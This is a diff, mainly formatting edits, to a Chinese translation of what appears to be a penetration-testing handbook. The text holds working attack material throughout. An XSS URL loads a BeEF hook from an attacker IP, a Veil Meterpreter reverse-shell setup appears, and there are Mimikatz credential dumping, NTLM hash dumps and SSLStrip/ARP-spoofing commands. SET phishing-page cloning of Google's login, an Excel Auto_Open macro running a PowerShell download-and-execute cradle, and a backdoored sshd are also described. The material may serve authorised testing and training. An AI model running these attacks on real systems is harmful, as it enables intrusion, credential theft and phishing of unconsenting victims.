 这证明最终用户确实处理了从我们的查询中嵌入的 JavaScript 代码。为了创建一个成功的利用，我们不打印 Cookie，而是将构建一个使用 JavaScript 包含 `hook.js` 文件的 URL。它看起来会像这样：`http://securepla.net/xss_example/example.php?alert=asda<script src=http://192.168.10.91:3000/hook.js></script>`。我通过使用以下 JavaScript 代码追加了 `hook.js` 脚本：
 
-*   `<script src=[包含 hook.js 的 URL]></script>
+*   `<script src=[包含 hook.js 的 URL]></script>`
 
 请记住，如果这是在公共网站上进行，则该 URL 需要指向托管 `hook.js` 页面和监听服务的公共地址。
 
@@ -1334,11 +1226,11 @@ BeEF 服务器启动后，让我们登录控制台 UI。正如上图所示，本
 
 #### OWASP 备忘单
 
-
-
 另一个我常用且想提及的列表是 OWASP 绕过备忘单。在我的测试过程中，当我遇到编码问题时，这通常是我首先查阅的地方。备忘单可在此处找到：[`www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet`](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)。我发现最常见的 XSS 防护措施是长度限制和不允许使用大于/小于符号。幸运的是，OWASP 提供了许多不同的示例来绕过这些问题。
 
 ![](img/00080.jpeg)
+
+### 跨站请求伪造（CSRF）
 
 跨站请求伪造（CSRF）发生在你能强制受害者执行不想要的操作时。我典型的例子是：你向一个当前已登录其银行账户的人发送一个链接。当他们访问你发送的链接时，会自动将其账户中的钱转到你的账户。之所以会发生这种情况，是因为没有验证用户是否经过了转账的正确流程。
 
@@ -1346,7 +1238,7 @@ BeEF 服务器启动后，让我们登录控制台 UI。正如上图所示，本
 
 测试这一点有许多复杂的方法，但我手动运行这些测试最简单的方法是通过代理流量。我会完全按照上述步骤进行转账操作，并查看是否可以重放该请求。
 
-### 使用 Burp 进行 CSRF 重放攻击
+#### 使用 Burp 进行 CSRF 重放攻击
 
 让我们以一个银行应用程序允许用户之间转账为例。在下面的 URL 中，使用了两个参数。第一个参数 `User` 是收款人，`Dollar` 是金额。在下面的例子中，我们成功地向 Frank 转了账。
 
@@ -1382,6 +1274,8 @@ BeEF 服务器启动后，让我们登录控制台 UI。正如上图所示，本
 
 ![](img/00085.jpeg)
 
+### 会话令牌分析
+
 会话令牌通常用于跟踪会话，因为 HTTP 协议默认是无状态的。你需要在会话令牌中寻找的是：(1) 它们无法被猜测，以及 (2) 它们能正确跟踪用户。其他你应该关注的方面包括：会话令牌何时过期、它们是否安全、是否验证输入，以及是否被正确使用。
 
 在本节中，我们将专门研究如何确保会话令牌经过适当的随机化且无法被猜测。使用 Burp Suite 捕获认证过程，我们可以在响应中看到会话令牌有一个 `set-cookie` 值。这位于“Proxy”选项卡下的“History”子选项卡中。
@@ -1412,6 +1306,8 @@ BeEF 服务器启动后，让我们登录控制台 UI。正如上图所示，本
 
 ![](img/00090.jpeg)
 
+### 使用 Burp Suite Intruder 进行参数模糊测试
+
 Burp Suite 具有极强的扩展性，还有许多其他功能。在手动测试中，我发现一个非常有用的快速功能是 Intruder 功能。在 Intruder 功能中，你可以篡改请求的任何部分并提供自己的数据。如果你想提供自己的模糊测试输入来测试变量，这将非常有用。
 
 我们将演示一个非常高层级的概述，说明如何使用模糊测试功能。以下示例的基本思路是：以一个在线商店为例，看看参数模糊测试为何极具益处。它们可能只从网站链接到特定商品，但内容管理员可能已经上传了下周所有的促销商品。他们只是等到下周，再从主网站首页链接这些内容。
@@ -1424,15 +1320,15 @@ Burp Suite 具有极强的扩展性，还有许多其他功能。在手动测试
 
 **图 54 - 暴力破解参数**
 
-
-
-## 使用 Burp Suite Intruder 暴力破解参数
+#### 使用 Burp Suite Intruder 暴力破解参数
 
 我们想要遍历所有不同的参数值，以查看哪些页面存在、哪些页面不存在。由于我们的流量已经流经 Burp，我们可以转到 **Proxy（代理）** 选项卡，然后进入 **History（历史记录）** 选项卡。你将在那里看到所有过去的请求。右键点击最后那个请求，然后点击 **Send to Intruder（发送到 Intruder）**。
 
 ![](img/00092.jpeg)
 
 **图 55 - 发送请求到 Intruder**
+
+
 
 顶部菜单栏的 **Intruder（入侵者）** 选项卡会亮起，点击该 **Intruder** 选项卡。移动到 **Positions（位置）** 选项卡，你会看到一堆高亮的文本。既然我这次只测试一个参数，我会先点击 **Clear（清除）** 按钮，仅高亮 `2` 这个值（因为它是我想要模糊测试的唯一值），然后点击右侧的 **Add（添加）** 按钮（图 56）。这会指示 Burp 仅对输入到 `ID` GET 参数中的值进行模糊测试，该参数现在会变为黄色。
 
@@ -1513,10 +1409,6 @@ Responder 主动利用的另一个漏洞是 **WPAD** 漏洞。你可以在此处
 **图 60 - 自动检测设置**
 
 作为攻击者，既然我们与受害者在同一网络上，我们可以响应名称解析请求并注入我们自己的 PAC 文件，从而代理所有 Web 流量。这样我们还可以强制用户针对我们的 SMB 服务器进行身份验证。你可能会问，“这为什么很重要”？如果我们能让受害主机针对我们的 SMB 服务器进行身份验证，我们就可以在不提醒受害者任何配置错误的情况下，请求其 NTLM 质询/响应哈希。如果用户已经过域身份验证，他们将尝试使用那些缓存的凭据来针对我们的服务器进行身份验证。
-
-
-
-
 
 ## Responder 工具使用与权限提升
 
@@ -1622,12 +1514,11 @@ if(len(sys.argv) != 2):
     sys.exit(0)
 ```
 
-
-
-
 ## 初始化密钥
 
 来自 MSDN：[`msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2`](http://msdn.microsoft.com/en-us/#fbid=UVOac95R90O)
+
+
 
 ```python
 key = """
@@ -1703,9 +1594,7 @@ testpassword
 
 ![](img/00112.jpeg)
 
-我想专门开辟一个章节来介绍后利用技巧。假设你拿下了一台 Linux 盒子或一台 Windows 主机，你想找些什么？我开始整理一份清单，但后来发现了来自 Rob Fuller (Mubix) 和 [room362.com](http://room362.com) 的一份非常全面的清单。
-
-### 来自 Room362.com 的后利用清单
+## 来自 Room362.com 的后利用清单
 
 *   Linux/Unix/BSD 后利用：[`bit.ly/pqJxA5`](http://bit.ly/pqJxA5)
 *   Windows 后利用：[`bit.ly/1em7gvG`](http://bit.ly/1em7gvG)
@@ -1735,34 +1624,37 @@ testpassword
 
 *   `cd /opt/Veil`
 
-
-
-
 ## Veil Payload 生成与 Metasploit 集成
 
 ### Veil Payload 生成
 
 #### 初始设置
+
 运行 `./Veil.py` 启动 Veil。
 
 在本例中，我们将使用 `MeterHTTPSContained` payload，输入以下命令选择：
+
 *   `use 20`
 
 ![Figure 67 - Veil 启动界面](img/00115.jpeg)
 
 #### 配置监听器
+
 与 Metasploit 类似，我们需要设置 `LHOST` 和 `LPORT`。本例中攻击机 IP 为 `192.168.75.131`，`LPORT` 设为 `443`（模拟 SSL 流量）。
 
 *   `set LHOST 192.168.75.131`
 *   `set LPORT 443`
 
 #### 生成 Payload
+
 配置完成后，输入以下命令生成 payload：
+
 *   `generate`
 
 ![Figure 68 - 配置 Veil](img/00116.jpeg)
 
 #### 选择编译器
+
 使用默认的 `pyinstaller` 进行编译：
 
 ![Figure 69 - Veil 与 Python 的威力](img/00117.jpeg)
@@ -1794,11 +1686,13 @@ testpassword
 ![Figure 71 - Reverse HTTPS 处理器](img/00119.jpeg)
 
 获得 Meterpreter 会话后，使用以下命令进行交互：
+
 *   `sessions -i [session number]`
 
 ### Mimikatz 凭证导出
 
 #### 进程迁移
+
 回顾上一节提到的在内存中运行 Mimikatz。若目标为 64 位系统，必须先迁移至 64 位进程，因为只有 64 位进程才能从 64 位系统内存中读取明文密码。32 位系统虽可迁移但非必须。
 
 使用 `ps` 列出进程，使用 `migrate [pid]` 进行迁移。下例中识别出运行中的 64 位 `Notepad` 进程并迁移至该进程。
@@ -1807,11 +1701,14 @@ testpassword
 *   `migrate [pid of a x86_64 process]`
 
 #### 权限提升
+
 执行上述命令前可能需要 `SYSTEM` 权限。使用以下命令尝试提权：
+
 *   `getsystem`
 *   若被拒绝且为本地管理员，请参考绕过 UAC 章节。
 
 #### 导出凭证
+
 成功迁移并以 `SYSTEM` 权限运行后，加载 Mimikatz 并执行 `kerberos`（或 `wdigest`）命令以获取当前登录用户的明文密码。
 
 *   `kerberos`
@@ -1875,6 +1772,12 @@ SMBExec 使用有效凭证连接 DC，验证路径，尝试创建 `ntds.dit` 和
 
 示例受害 DC 中导出的 NTLM 哈希如下：
 
+
+
+## PowerShell 横向移动与 PowerSploit 利用
+
+### 哈希示例
+
 ```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:8b9e471f83d355eda6bf63524b044870:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -1883,15 +1786,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:876c4efd01dbf8da6cd04c60ddac0f95:::
 bobsmith:1105:aad3b435b51404eeaad3b435b51404ee:8faf590241a5d5ed59fb80eb00440589:::
 ```
 
-
-
-
-
-## PowerShell 横向移动与 PowerSploit 利用
-
-### 哈希示例
-
-```text
+```
 domainadmin: 1106: aad3b435b51404eeaad3b435b51404ee:8faf59024 1a5d5ed59fb80eb00440589:::
 pmartian: 1107: aad3b435b51404eeaad3b435b51404ee:8faf590241a5d 5ed59fb80eb00440589:::
 ```
@@ -1900,7 +1795,7 @@ pmartian: 1107: aad3b435b51404eeaad3b435b51404ee:8faf590241a5d 5ed59fb80eb004405
 
 ![](img/00125.jpeg)
 
-([`github.com/mattifestation/PowerSploit`](https://github.com/mattifestation/PowerSploit)) (Windows)
+[`github.com/mattifestation/PowerSploit`](https://github.com/mattifestation/PowerSploit) (Windows)
 
 我之所以专门用几个章节介绍 PowerShell，是因为我认为攻击的未来将走向 PowerShell。我们行业中有许多优秀人才正在开发工具和技术，利用 PowerShell 和 WMI 来调用原生 Windows 工具。
 
@@ -1986,10 +1881,6 @@ SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUA-dAAuAFcAZQBiAEMAbABpAGUAbgB0ACk
 
 **图 77 - 远程连接主机并执行载荷**
 
-
-
-
-
 ## PowerShell 后渗透与 ARP 投毒
 
 ### Meterpreter 会话建立
@@ -2030,7 +1921,7 @@ SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUA-dAAuAFcAZQBiAEMAbABpAGUAbgB0ACk
 
 ### Nishang 框架
 
-([`code.google.com/p/nishang/`](https://code.google.com/p/nishang/)) (Windows)
+[`code.google.com/p/nishang/`](https://code.google.com/p/nishang/) (Windows)
 
 PowerShell 社区的另一位活跃成员是 Nikhil Mittal。你可以在 [`code.google.com/p/nishang/`](https://code.google.com/p/nishang/) 找到他的作品，撰写本文时当前版本为 3.0。
 
@@ -2066,6 +1957,8 @@ PowerShell 社区的另一位活跃成员是 Nikhil Mittal。你可以在 [`code
 
 从上面的示例中，我们可以看到 SSID 名称和存储在 `Key_Content` 中的密码。^(19) 如果他们使用静态密钥认证过程（非 WPA-Enterprise），我们现在可以连接到他们的无线网络，而无需破解任何哈希值。
 
+
+
 如果你想了解 Nishang 工具的更多功能，请访问他的网站 [`www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html`](http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html)。正如我们所见，PowerShell 极其强大，随着更多研究人员投入 PowerShell 领域，我们将看到越来越多面向渗透测试人员的功能。
 
 ![](img/00134.jpeg)
@@ -2090,7 +1983,7 @@ PowerShell 社区的另一位活跃成员是 Nikhil Mittal。你可以在 [`code
 
 **图 83 - Cain and Abel 扫描 MAC 地址**
 
-接下来，在 `Cain` 底部切换到 APR 选项卡，在左侧列选择 APR，点击顶部工具栏的“加号”按钮（注意：+ 按钮可能不可见。尝试点击中间窗格以启用该按钮）。
+接下来，在 `Cain` 底部切换到 APR 选项卡，在左侧列选择 APR，点击顶部工具栏的“加号”按钮（注意：`+` 按钮可能不可见。尝试点击中间窗格以启用该按钮）。
 
 ![](img/00137.jpeg)
 
@@ -2107,9 +2000,6 @@ PowerShell 社区的另一位活跃成员是 Nikhil Mittal。你可以在 [`code
 ![](img/00139.jpeg)
 
 **图 86 - 成功投毒**
-
-
-
 
 ## 既然我们已经实现了完整的 MITM ARP 投毒
 
@@ -2206,31 +2096,37 @@ Chema Alonso 开发了一款工具，用于对 IPv6 网络执行 ARP 欺骗攻�
 #### 如何运行 Hamster/Ferret：
 
 1.  **首先启用 IP 转发：**
+
     ```
     echo “1” >/proc/sys/net/ipv4/ip_forward
     ```
 
 2.  **然后修改 IP 表以用于 SSL Strip：**
+
     ```
     iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
     ```
 
 3.  **接下来，配置并运行 SSL Strip：**
+
     ```
     sslstrip -f -a -k -l 1000 -w/root/out.txt &
     ```
 
 4.  **接下来，启用 ARP 欺骗 - 记住这将对网络上的所有人进行 ARP 欺骗：**
+
     ```
     arpspoof -i eth0 [gateway]
     ```
 
 5.  **接下来，启用 Ferret。在一个新的终端窗口中：**
+
     ```
     ferret -i eth0
     ```
 
 6.  **最后启用 Hamster。在一个新的终端窗口中：**
+
     ```
     hamster
     ```
@@ -2257,18 +2153,13 @@ Chema Alonso 开发了一款工具，用于对 IPv6 网络执行 ARP 欺骗攻�
 
 ## Firesheep
 
-
-
-
-## Firesheep
-
 我不会过多谈论 Firesheep，因为它是一个较旧的工具，且与上面的示例类似，但其概念至今仍然存在。您可以在此处阅读更多相关信息：[`codebutler.com/firesheep/`](http://codebutler.com/firesheep/)。Firesheep 是 Firefox 的一个附加组件，它嗅探无线或有线网络中以明文传输的会话令牌。在您的浏览器窗口中，它会呈现一个带框架的页面，您可以点击捕获到的用户并立即成为该用户。您无需手动添加任何自己的 Cookie，但它仅适用于有限数量的网站。
 
 根本问题在于：当会话 Cookie 未设置 `Secure` 标志且协议非 HTTPS 时，Cookie 就有可能以明文形式传输。如何检查您的 Cookie 是否安全？我将首先登录到我自己的网站，然后查看我的 Cookie。我使用 Firefox 的 web-developer 附加组件来执行此操作。
 
 ![](img/00151.jpeg)
 
-图 94 - Cookie 信息与安全 Cookie
+**图 94 - Cookie 信息与安全 Cookie**
 
 在上图中，用于维持用户状态的 `mw_session` 令牌在未开启 secure 标志的情况下传输。如果应用程序在任何时候通过 HTTP 引用该页面上的信息，或者攻击者能强制受害者通过 HTTP 访问 [www.securepla.net](http://www.securepla.net)，攻击者将获得完整的会话令牌，并能利用用户的访问权限。
 
@@ -2282,7 +2173,7 @@ Chema Alonso 开发了一款工具，用于对 IPv6 网络执行 ARP 欺骗攻�
 
 ![](img/00152.jpeg)
 
-图 95 - Cain and Abel APR-DNS
+**图 95 - Cain and Abel APR-DNS**
 
 第二件事是建立一个用于窃取凭证的伪造页面。为了克隆网站，我通常使用社会工程学工具包 (SET)。我在后面的社会工程学部分会讲解一个更详细的示例，但运行 SET 菜单后，依次进入 1 - Social Engineering Attacks（社会工程学攻击），2 - Website Attack Vectors（网站攻击向量），3 - Credential Harvester Attack Method（凭证收集攻击方法），2 - Site Cloner（网站克隆器）。
 
@@ -2290,13 +2181,13 @@ Chema Alonso 开发了一款工具，用于对 IPv6 网络执行 ARP 欺骗攻�
 
 ![](img/00153.jpeg)
 
-图 96 - 克隆 Google 的认证页面
+**图 96 - 克隆 Google 的认证页面**
 
 现在我们已经配置好 DNS 欺骗并建立了伪造页面，当 ARP 欺骗的受害者决定访问 [google.com](http://google.com) 时，他们将被重定向到我们克隆的 SET 网页。任何用户名和密码都将打印到我们的屏幕上，然后用户会被重定向到真正的 Google 页面，使其看起来像是用户输入了错误的密码。
 
 ![](img/00154.jpeg)
 
-图 97 - 被欺骗的 Google 认证页面与受害者的密码
+**图 97 - 被欺骗的 Google 认证页面与受害者的密码**
 
 ## SSLStrip
 
@@ -2315,13 +2206,15 @@ ettercap -TqM arp: remote/192.168.0.12//192.168.0.1/
 
 ![](img/00155.jpeg)
 
-图 98 - SSL Strip
+**图 98 - SSL Strip**
 
 当您的受害者 (`192.168.0.12`) 访问 [facebook.com](http://facebook.com) 时，它不会重定向到 Facebook 的 HTTPS 版本进行认证。在下面的示例中，用户访问 Facebook 并输入其用户名和密码。如果我们回到 `ettercap` 终端，将看到用户名和密码滚动显示。
 
 ![](img/00156.jpeg)
 
-图 99 - 受害者访问 [Facebook.com](http://Facebook.com) 并被重定向到 HTTP 及捕获的密码
+**图 99 - 受害者访问 [Facebook.com](http://Facebook.com) 并被重定向到 HTTP 及捕获的密码**
+
+
 
 ![](img/00157.jpeg)
 
@@ -2349,14 +2242,11 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=192.168.0.5 c
 
 我花费了大量研究时间研究同形异义域名，试图找到最高效、投入产出比最高的攻击。您可以在此处找到更多我的研究论文：[`www.wired.com/threatlevel/2011/09/doppelganger-domains/`](http://www.wired.com/threatlevel/2011/09/doppelganger-domains/)。
 
-我研究论文的概念是暴力破解公司域名，寻找拥有 MX 记录的有效子域名。在接下来的几个示例中，我们有两家不同的虚构公司，它们利用子域名进行邮件通信：us.company.com 和 uk.company.com。我所做的是购买了 [uscompany.com](http://uscompany.com)、ukcompany.com 等所有域名。这是因为最终用户非常频繁地会犯一个错误：忘记在域名和子域名之间输入句点。
+我研究论文的概念是暴力破解公司域名，寻找拥有 MX 记录的有效子域名。在接下来的几个示例中，我们有两家不同的虚构公司，它们利用子域名进行邮件通信：`us.company.com` 和 `uk.company.com`。我所做的是购买了 `uscompany.com`、`ukcompany.com` 等所有域名。这是因为最终用户非常频繁地会犯一个错误：忘记在域名和子域名之间输入句点。
 
 ![](img/00161.jpeg)
 
 购买这些域名后，我搭建了一个 SMTP 服务器，配置了 MX 记录，最后将所有 SMTP 服务器设置为捕获所有邮件的服务器。这意味着无论发给我拥有的域名下的谁，我都会记录/转发所有这些邮件到我选择的账户。
-
-
-
 
 这通常足以证明你可以成功捕获敏感数据，并且你将看到来自该公司的大量敏感邮件。如果你查看上文提到的文章，你将看到收集了什么类型的数据，以及我们有多少次能够获得进入公司的 SSH/VPN/远程访问权限。我们还将概念验证攻击向前推进了一步。
 
@@ -2387,8 +2277,7 @@ wget http://mirror.team-cymru.org/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar
 解压 OpenSSH：
 
 *   `tar xvfz openssh-5.9p1.tar.gz`
-*   进入 openssh 目录：
-    `cd openssh-5.9`
+*   进入 openssh 目录：`cd openssh-5.9`
 
 在编译 sshd 之前，我需要修改 `auth-passwd.c` 文件。以下是我更改的内容，但我也包含了你应该替换到 sshd 中的完整 `auth-passwd.c` 文件：
 
@@ -2479,16 +2368,14 @@ root: hx7wnk:192.168.10.19
 
 ### 凭据收割器
 
-
-
 SET 加载完成后，我通常采用两种常见方法。第一种是凭证收集器。这是创建一个看起来像认证页面的虚假页面，诱使用户输入其凭证。SET 中有许多不同的方法，我建议你花时间研究一下，但我通常是在寻找账户信息。
 
 要生成一个虚假页面，请按以下步骤操作：
 
-1.  (社会工程学攻击)
-2.  (网站攻击向量)
-3.  (凭证收集器)
-4.  (站点克隆器)
+1.  社会工程学攻击
+2.  网站攻击向量
+3.  凭证收集器
+4.  站点克隆器
 5.  选择 IP 或主机以接收 POST 回传数据
 6.  选择要克隆的站点（示例：`https://accounts.google.com/ServiceLogin`）
 
@@ -2504,7 +2391,7 @@ SET 加载完成后，我通常采用两种常见方法。第一种是凭证收�
 
 我执行的第二种攻击类型是危害受害者机器的攻击。如果你能让受害者访问你拥有的站点，就可以使用 JAVA 有效载荷下载并执行 Meterpreter shell。要生成一个虚假页面，请按以下步骤操作：
 
-1.  (社会工程学攻击)
+1.  社会工程学攻击
 2.  网站攻击向量
 3.  Java Applet 攻击方法
 4.  Web 模板
@@ -2570,7 +2457,7 @@ except smtplib.SMTPException:
 要群发邮件，你必须运行社会工程学工具包并按以下步骤操作：
 
 1.  `setoolkit`
-2.  (社会工程学攻击)
+2.  社会工程学攻击
 3.  群发邮件攻击
 4.  电子邮件群发攻击
 5.  输入邮箱列表的完整路径
@@ -2595,6 +2482,8 @@ except smtplib.SMTPException:
 打开 Excel 文件后，在“视图”选项卡下，点击“宏”下的下拉菜单，转到“查看宏”。接下来，点击“创建宏”并命名宏名称：
 
 *   `Auto_Open`
+
+
 
 你必须将其命名为 `Auto_Open`，这会指示 Excel 应用程序在启动时自动运行你的宏。接下来，我们需要添加代码以执行 PowerShell 有效载荷，将 Meterpreter 会话连接回我们的监听器。返回“使用 PowerSploit 进行后渗透”部分，复习如何生成 base64 字符串以使用 PowerSploit 连接回你的处理程序。
 
@@ -2621,9 +2510,6 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.github.com/mattifesta
 图 111 - 使用 PowerShell 创建宏
 
 将其另存为 XLS 文件（而非 XLSX 文件），因为 XLSX 不会运行宏。在发送 Excel 文件之前，你需要启动监听器 (`StartListener.py`)。该监听器也在“使用 PowerSploit 进行后渗透”部分讨论过，你可以参考该部分。
-
-
-
 
 ## 无线攻击与社会工程学
 
@@ -2665,7 +2551,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.github.com/mattifesta
 
 `Alfa AWUS051NH` 购买链接：
 
-[`www.amazon.com/Alfa-AWUS051NH-802-11a-Wireless-9dBi/dp/B002BFO490/ref=sr\_1\_cc\_1?s=aps&ie=UTF8&qid=1380485861&sr=1-1-catcorr&keywords=AWUS051NH`](http://www.amazon.com/Alfa-AWUS051NH-802-11a-Wireless-9dBi/dp/B002BFO490/ref=sr_1_cc_1?s=aps&ie=UTF8&qid=1380485861&sr=1-1-catcorr&keywords=AWUS051NH)
+[`www.amazon.com/Alfa-AWUS051NH-802-11a-Wireless-9dBi/dp/B002BFO490/ref=sr_1_cc_1?s=aps&ie=UTF8&qid=1380485861&sr=1-1-catcorr&keywords=AWUS051NH`](http://www.amazon.com/Alfa-AWUS051NH-802-11a-Wireless-9dBi/dp/B002BFO490/ref=sr_1_cc_1?s=aps&ie=UTF8&qid=1380485861&sr=1-1-catcorr&keywords=AWUS051NH)
 
 我从亚马逊购买的这款，附带了一根 9dBi 天线和一根 5dBi 天线。如果你需要更远的距离，我强烈建议再买一根 `Yagi` 天线（八木天线）。它是一种定向天线，增益是标准天线的两倍多。
 
@@ -2720,18 +2606,22 @@ kismet
 
 #### WEP - 有线等效保密
 
-我们现在应该都知道，在无线网络中使用 `WEP` 是不安全的。我不会深入细节，但如果你想了解更多关于它是如何被错误实施和配置的，可以访问维基百科页面：[`en.wikipedia.org/wiki/Wired\_Equivalent\_Privacy`](http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy)。如果你发现目标组织正在使用 `WEP` 且至少有 1 个客户端连接，你应该能毫无问题地破解 `WEP` 密码。
+我们现在应该都知道，在无线网络中使用 `WEP` 是不安全的。我不会深入细节，但如果你想了解更多关于它是如何被错误实施和配置的，可以访问维基百科页面：[`en.wikipedia.org/wiki/Wired_Equivalent_Privacy`](http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy)。如果你发现目标组织正在使用 `WEP` 且至少有 1 个客户端连接，你应该能毫无问题地破解 `WEP` 密码。
 
 为了实现这一点，我们将使用工具 `Fern-Wi-Fi-cracker` 来识别 `WEP` 网络并尝试破解它们。我使用 `Fern-Wi-Fi-Cracker` 是因为它原生包含在 `Kali` 中，并利用了 `Aircrack-ng`（正如我之前所说，这是我最喜欢的 Wi-Fi 工具）。一个快速提示：对于下面的示例，你要攻击的接入点需要在该网络上至少有一个活跃的主机。有办法绕过这个限制（搜索 Newsham 攻击），但我不会在本书中介绍，因为以下攻击是你将遇到的最常见情况。
 
 ##### 如何在 Kali 中破解 WEP：
 
 1.  在命令提示符下输入：
+
     ```
     fern-wifi-cracker
     ```
+
 2.  选择下拉菜单并选择你的 Wi-Fi 网卡（通常是 `wlan0`）
+
 3.  点击**扫描**按钮
+
 4.  进入 `WEP` 选项（红色的 Wi-Fi 标志）
 
 ![](img/00191.jpeg)
@@ -2739,8 +2629,11 @@ kismet
 **图 118 - Fern WIFI Cracker**
 
 5.  选择你要攻击的 SSID（本例中为 `Rocket`）
+
 6.  点击右侧的**Wi-Fi 攻击**。
+
 7.  观察 IV 计数。你需要至少 10k 个 IV 才能破解密码
+
 8.  如果成功，你将在下方看到 `WEP` 密钥
 
 ![](img/00192.jpeg)
@@ -2753,10 +2646,6 @@ kismet
 
 `WPAv2` 不像 `WEP` 那样存在漏洞，破解密码难度大得多。要实施成功的攻击，你需要捕获客户端到接入点的认证握手包。为了“作弊”完成这个过程，我们可以强制用户去认证，然后重新认证。一旦我们捕获了握手包，就不能直接剥离出密码，而必须进行暴力破解或字典破解。让我们看看这个过程。
 
-
-
-
-
 ## 无线网络攻击指南
 
 ### 启用 Fern-WiFi-Cracker 捕获文件设置
@@ -2764,11 +2653,15 @@ kismet
 在开始嗅探之前，我们需要在 `Fern-WiFi-Cracker` 中启用捕获文件设置，因为我们将使用此握手文件进行破解。
 
 1. 在命令提示符下输入：
+
    ```
    fern-WiFi-cracker
    ```
+
 2. 转到 `ToolBox`
+
 3. 点击 `WIFI Attack Options`
+
 4. 选择 `Capture File Settings`
 
 ![](img/00193.jpeg)
@@ -2776,10 +2669,15 @@ kismet
 **图 120 - 启用捕获文件设置**
 
 5. 按 `ESC` 键返回 `Fern-Wifi-Cracker` 主界面
+
 6. 选择下拉菜单并选择你的 Wi-Fi 网卡（通常是 `wlan0`）
+
 7. 点击 `Scan` 按钮
+
 8. 进入 `WPA`（蓝色 Wi-Fi 图标）
+
 9. 选择要攻击的 `SSID`
+
 10. 点击 `WIFI Attack`
 
 在下图中，你将看到创建的 cap 文件。
@@ -2834,6 +2732,7 @@ kismet
     *   `patch -p1 < freeradius-wpe-2.1.12.patch`
     *   `./configure && make && make install`
 6.  编辑配置：
+
     ```
     cat >> clients.conf <<EOF
     client 192.168.1.1 {
@@ -2841,6 +2740,7 @@ kismet
     }
     EOF
     ```
+
 7.  `radiusd -X`
 8.  在单独的终端中：
     *   `tail -f /usr/local/var/log/radius/freeradius-server-wpe.log`
@@ -2868,6 +2768,8 @@ response: be:17:da:45:c0:88:ed:9c:eb:c9:5c:38:b8:1f:3e:8f:90:cd:17:16:ad:87:b3:e
 
 *   `genkeys -r darkc0de.lst -f words.dat -n words.idx`
 
+
+
 `Asleap` 是一种利用 `genkeys` 生成的密码列表来恢复 LEAP 和 PPTP 类型连接的工具。`Asleap` 将接收如下所示的 challenge 和 response。
 
 ```
@@ -2883,7 +2785,7 @@ asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
 
 在上面的示例中，我们成功解密了 WPA-Enterprise 认证的 challenge/response 哈希。现在使用这些凭据重新登录他们的无线网络。
 
-### Karmetasploit
+## Karmetasploit
 
 我以前使用过的一种攻击（除非客户要求，否则不再提供）是模拟接入点，让用户基于其系统查找的历史接入点自动连接，或手动诱使用户连接。
 
@@ -2903,13 +2805,9 @@ asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
 
 如果你对门禁卡克隆感兴趣，可以深入研究以下硬件工具：
 
-*   **ProxMark3** - RFID 克隆
-*   **ProxBrute** - 暴力破解
-*   **RFIDiot** - RFID 克隆和脚本
-
-
-
-
+*   `ProxMark3` - RFID 克隆
+*   `ProxBrute` - 暴力破解
+*   `RFIDiot` - RFID 克隆和脚本
 
 ## 物理渗透测试工具与技术
 
@@ -2923,16 +2821,16 @@ Bishop Fox 的研究人员创建了一个名为 Tastic RFID 的物理工具，�
 
 这是我最喜欢的近期研究项目之一。您潜入公司，将设备投放到企业基础设施中，然后撤离。投递盒会通过蜂窝网络、Wi-Fi 连接回控制端，或创建一个反向 Shell 连接到您选择的服务器。
 
-专业版设备称为 PwnPlug，可在此购买：[`pwnieexpress.com/products/pwnplug-elite`](http://pwnieexpress.com/products/pwnplug-elite)。唯一的问题是成本极高，且丢失设备的风险很大。
+专业版设备称为 `PwnPlug`，可在此购买：[`pwnieexpress.com/products/pwnplug-elite`](http://pwnieexpress.com/products/pwnplug-elite)。唯一的问题是成本极高，且丢失设备的风险很大。
 
-因此，我选择了另一条路线。我成为了 Odroid U2 的忠实粉丝。不仅在规格上它碾压 Pwn Plug，而且成本仅为其零头（约 120 美元含运费）。
+因此，我选择了另一条路线。我成为了 `Odroid U2` 的忠实粉丝。不仅在规格上它碾压 `Pwn Plug`，而且成本仅为其零头（约 120 美元含运费）。
 
 #### Odroid U2 规格
 
-Odroid-U2 是一款极其强大的小盒子，就价格而言，它碾压市面上一切同类产品。
+`Odroid-U2` 是一款极其强大的小盒子，就价格而言，它碾压市面上一切同类产品。
 
 *   1.7Ghz 四核 Arm Cortex-A9 MPCore
-*   2 GB 内存（据信 Pwn Plug 仅有 512 MB）
+*   2 GB 内存（据信 `Pwn Plug` 仅有 512 MB）
 *   多个 USB 接口和 10/100Mbps RJ-45 网口
 *   使用 micro-SD 卡
 *   拥有 HDMI 接口（micro HDMI）
@@ -2961,7 +2859,7 @@ Figure 124 - Odroid U2
 
 使用 Kali 设置新的投递盒非常简单。Offensive Security 团队做了大量出色工作，专门为这些设备添加了 ARM 架构支持。
 
-从 [`www.kali.org/downloads/`](http://www.kali.org/downloads/) 下载 Odroid U2 镜像。
+从 [`www.kali.org/downloads/`](http://www.kali.org/downloads/) 下载 `Odroid U2` 镜像。
 
 1.  使用任意 Linux 发行版（可使用 Kali），将 microSD 卡插入电脑
 2.  使用 `dd` 工具将下载的镜像写入 microSD 卡。示例中假设存储设备位于 `/dev/sdb`，请根据实际情况修改
@@ -2981,7 +2879,7 @@ Figure 124 - Odroid U2
 
 需创建几个自动化脚本。首先确保 SSH 服务器配置正确，安装 `sshpass` 以便脚本化回连，并创建 cron 任务。
 
-##### 1. 启用 SSH 服务器
+##### 启用 SSH 服务器
 
 a. `apt-get install openssh-server`
 b. `apt-get install openssh-client`
